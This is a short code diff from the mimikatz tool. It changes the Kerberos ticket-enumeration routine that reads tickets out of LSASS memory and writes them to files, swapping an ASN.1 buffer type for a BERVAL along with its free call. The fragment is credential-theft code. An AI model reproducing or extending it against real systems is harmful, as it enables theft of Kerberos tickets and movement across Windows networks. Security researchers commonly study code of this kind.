@@ -549,7 +549,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 	KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aTicket = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassBuffer = {tickets, pData->cLsass->hLsassMem};
 	DWORD nbTickets = 0;
 	PKIWI_KERBEROS_TICKET pKiwiTicket;
-	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
+	PBERVAL BerApp_KrbCred;
 	BOOL isNormalSessionKey;
 	wchar_t * filename;
 
@@ -572,12 +572,12 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 						if(isFile)
 							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
 							{
-								if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
+								if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
 								{
-									if(kull_m_file_writeData(filename, App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
+									if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 										kprintf(L"\n\t   * Saved to file %s !", filename);
 									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
-									LocalFree(App_KrbCred);
+									ber_bvfree(BerApp_KrbCred);
 								}
 								LocalFree(filename);
 							}
